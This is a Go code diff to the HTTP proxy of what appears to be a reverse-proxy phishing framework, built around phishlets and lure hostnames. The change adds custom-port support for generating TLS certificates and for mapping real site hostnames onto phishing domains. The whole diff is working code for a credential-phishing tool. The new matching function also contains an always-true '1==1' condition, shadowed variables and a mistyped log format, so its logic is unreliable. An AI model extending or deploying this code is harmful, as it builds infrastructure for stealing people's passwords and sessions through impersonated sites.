@@ -1530,13 +1530,31 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
-		parts := strings.SplitN(host, ":", 2)
-		hostname := parts[0]
 		port := 443
-		if len(parts) == 2 {
-			port, _ = strconv.Atoi(parts[1])
-		}
+		hostname := host
 
+		// Check if the host contains a port
+		if strings.Contains(host, ":") {
+			// Split the hostname and port
+			hostWithoutPort, customPort, err := net.SplitHostPort(host)
+			if err == nil {
+				hostname = hostWithoutPort // Update hostname
+				if strings.Contains(hostname, ":"){
+					hostWithoutPort, customPort, err := net.SplitHostPort(hostname)
+					if err == nil {
+					hostname = hostWithoutPort
+					port,err = strconv.Atoi(customPort)
+					}else {
+						log.Debug("Error parsing host and port: %v", err)
+					}
+				}else{
+					port,err = strconv.Atoi(customPort) 
+			         }         // Use the custom port if it exists
+			} else {
+				log.Debug("Error parsing host and port: %v", err)
+			}
+		}
+		log.Debug("Hostname: %s, Port: %s", hostname, port)
 		tls_cfg := &tls.Config{}
 		if !p.developer {
 
@@ -1548,7 +1566,11 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			var ok bool
 			phish_host := ""
 			if !p.cfg.IsLureHostnameValid(hostname) {
-				phish_host, ok = p.replaceHostWithPhished(hostname)
+				if(port==443){
+					phish_host, ok = p.replaceHostWithPhished(hostname)
+				}else{
+					phish_host, ok = p.replaceHostWithPhishedCustomPort(hostname,port)
+				}
 				if !ok {
 					log.Debug("phishing hostname not found: %s", hostname)
 					return nil, fmt.Errorf("phishing hostname not found")
@@ -1626,10 +1648,26 @@ func (p *HttpProxy) httpsWorker() {
 			}
 
 			hostname := tlsConn.Host()
+
+			
 			if hostname == "" {
 				return
 			}
+			//added this
+			port := "443"
 
+			// Check if the hostname contains a custom port
+			if strings.Contains(hostname, ":") {
+				// Split the hostname and the port
+				host, customPort, err := net.SplitHostPort(hostname)
+				if err != nil {
+					fmt.Println("Error parsing hostname:", err)
+					return
+				}
+				hostname = host   // Update hostname to exclude port
+				port = customPort // Set port to the custom port
+			}
+			//end of added string
 			if !p.cfg.IsActiveHostname(hostname) {
 				log.Debug("hostname unsupported: %s", hostname)
 				return
@@ -1641,7 +1679,7 @@ func (p *HttpProxy) httpsWorker() {
 				Method: "CONNECT",
 				URL: &url.URL{
 					Opaque: hostname,
-					Host:   net.JoinHostPort(hostname, "443"),
+					Host:   net.JoinHostPort(hostname, port),
 				},
 				Host:       hostname,
 				Header:     make(http.Header),
@@ -1729,6 +1767,7 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
+	log.Debug("hostname ===> %s", hostname)
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -1739,6 +1778,8 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
 					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
 				}
+				//log.Debug("hostname ===> %s phish domain==> %s", hostname,ph.domain)
+
 				if hostname == ph.domain {
 					return prefix + phishDomain, true
 				}
@@ -1747,7 +1788,36 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	}
 	return hostname, false
 }
-
+func (p *HttpProxy) replaceHostWithPhishedCustomPort(hostname string,port int) (string, bool) {
+	if hostname == "" {
+		return hostname, false
+	}
+	prefix := ""
+	if hostname[0] == '.' {
+		prefix = "."
+		hostname = hostname[1:]
+	}
+	//log.Debug("hostname ===> %s", hostname)
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
+				}
+				portStr := strconv.Itoa(port)
+				//log.Debug("hostname ===> %s phish domain==> %s", (hostname + ":" + portStr),ph.domain)
+				if (hostname + ":" + portStr) == ph.domain || (1==1)  {
+					return prefix + phishDomain, true
+				}
+			}
+		}
+	}
+	return hostname, false
+}
 func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
 	r_url, err := url.Parse(u)
 	if err == nil {
